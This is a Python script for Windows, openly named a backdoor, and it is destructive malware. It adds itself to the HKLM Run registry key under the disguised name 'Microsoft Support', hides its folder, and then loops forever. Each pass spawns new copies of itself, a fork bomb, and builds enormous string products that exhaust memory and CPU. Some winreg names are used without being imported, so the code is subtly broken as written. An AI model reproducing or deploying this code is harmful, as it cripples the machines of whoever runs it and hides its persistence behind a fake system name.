import itertools,subprocess,sys,os,winreg
f =  os.path.basename(sys.argv[0])
Backdoor_Name=os.path.basename(__file__)
hiddenPath = os.getcwd()
hiddenPath = '\"' + hiddenPath + '\"'
regPath = os.getcwd()
regPath = regPath + r"\%s"%Backdoor_Name
regPath = '\"' + regPath + '\"'
regConnect = winreg.ConnectRegistry(None, HKEY_LOCAL_MACHINE)
regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
SetValueEx(regKey,"Microsoft Support",0, REG_SZ, r"" + regPath)
os.system("attrib +h " + hiddenPath)
while True:
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	[''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=100)]
	[''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=100)]
